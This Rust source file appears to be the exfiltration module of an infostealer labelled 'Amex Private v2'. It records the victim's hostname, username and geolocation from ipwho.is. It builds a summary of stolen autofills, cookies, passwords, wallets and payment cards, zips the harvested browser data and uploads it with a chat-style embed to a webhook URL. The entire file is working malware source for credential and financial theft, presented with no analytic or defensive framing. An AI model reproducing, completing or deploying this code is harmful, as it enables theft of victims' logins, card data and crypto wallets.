use std::{env, fs, io::Write};

use serde::Deserialize;
use serde_json::json;
use zip::write::FileOptions;

use super::zip_layout::ExtractStats;

#[derive(Debug, Deserialize)]
struct GeoInfo {
    ip: Option<String>,
    country: Option<String>,
    city: Option<String>,
    success: Option<bool>,
}

fn hostname() -> String {
    env::var("COMPUTERNAME")
        .or_else(|_| env::var("HOSTNAME"))
        .unwrap_or_else(|_| "Unknown".to_string())
}

fn username() -> String {
    env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string())
}

fn safe_filename(name: &str) -> String {
    let cleaned: String = name
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
                c
            } else {
                '_'
            }
        })
        .collect();
    if cleaned.is_empty() {
        "browser_data".to_string()
    } else {
        cleaned
    }
}

async fn fetch_geo(client: &reqwest::Client) -> (String, String, String) {
    let fallback_ip = "Unknown".to_string();
    let fallback = (fallback_ip, "Unknown".to_string(), "Unknown".to_string());

    let response = match client
        .get("https://ipwho.is/")
        .timeout(std::time::Duration::from_secs(8))
        .send()
        .await
    {
        Ok(resp) if resp.status().is_success() => resp,
        Ok(resp) => {
            crate::log::log(&format!("geo lookup HTTP {}", resp.status()));
            return fallback;
        }
        Err(err) => {
            crate::log::log(&format!("geo lookup ERR: {err}"));
            return fallback;
        }
    };

    let geo: GeoInfo = match response.json().await {
        Ok(info) => info,
        Err(err) => {
            crate::log::log(&format!("geo parse ERR: {err}"));
            return fallback;
        }
    };

    if geo.success == Some(false) {
        return fallback;
    }

    (
        geo.ip.unwrap_or_else(|| "Unknown".to_string()),
        geo.country.unwrap_or_else(|| "Unknown".to_string()),
        geo.city.unwrap_or_else(|| "Unknown".to_string()),
    )
}

fn build_embed(username: &str, device: &str, stats: ExtractStats, ip: &str, country: &str, city: &str) -> serde_json::Value {
    json!({
        "embeds": [{
            "title": format!("{} ({})", username, device),
            "color": 0x00FF00,
            "fields": [
                {
                    "name": "📁 ADMINISTRATOR INFOS",
                    "value": format!(
                        "```\nAutoFills: {}\nCookies: {}\nPasswords: {}\nWallets: {}\nCards: {}\n```",
                        stats.autofills,
                        stats.cookies,
                        stats.passwords,
                        stats.wallets,
                        stats.cards
                    ),
                    "inline": false
                },
                {
                    "name": "🌍 System Info",
                    "value": format!(
                        "```\nIP: {}\nDevice: {}\nCountry: {}\nCity: {}\n```",
                        ip,
                        device,
                        country,
                        city
                    ),
                    "inline": false
                }
            ],
            "footer": { "text": "Amex Private v2" }
        }]
    })
}

pub async fn send_zip(
    client: &reqwest::Client,
    webhook_url: &str,
    files: &[(String, String)],
) -> Result<(), Box<dyn std::error::Error>> {
    if files.is_empty() {
        return Ok(());
    }

    let stats = super::zip_layout::count_from_files(files);
    let device = hostname();
    let user = username();
    let zip_name = format!("{}.zip", safe_filename(&device));
    let zip_path = env::temp_dir().join(&zip_name);

    crate::log::log(&format!("zip building: {} entries -> {}", files.len(), zip_name));

    {
        let file = fs::File::create(&zip_path)?;
        let mut zip = zip::ZipWriter::new(file);
        let options = FileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);

        for (name, content) in files {
            zip.start_file(name, options)?;
            zip.write_all(content.as_bytes())?;
        }

        zip.finish()?;
    }

    let zip_data = fs::read(&zip_path)?;
    crate::log::log(&format!("zip size: {} bytes", zip_data.len()));

    let (ip, country, city) = fetch_geo(client).await;
    crate::log::log(&format!("geo: {ip} / {country} / {city}"));

    let embed = build_embed(&user, &device, stats, &ip, &country, &city);
    let payload_json = serde_json::to_string(&embed)?;

    let part = reqwest::multipart::Part::bytes(zip_data)
        .file_name(zip_name.clone())
        .mime_str("application/zip")?;

    let form = reqwest::multipart::Form::new()
        .text("payload_json", payload_json)
        .part("file", part);

    let response = client.post(webhook_url).multipart(form).send().await?;
    let status = response.status();
    let body = response.text().await.unwrap_or_default();
    crate::log::log(&format!("webhook zip send: HTTP {status}"));
    if !status.is_success() {
        crate::log::log(&format!("webhook zip body: {body}"));
        return Err(format!("webhook failed: {status} {body}").into());
    }

    let _ = fs::remove_file(&zip_path);

    Ok(())
}
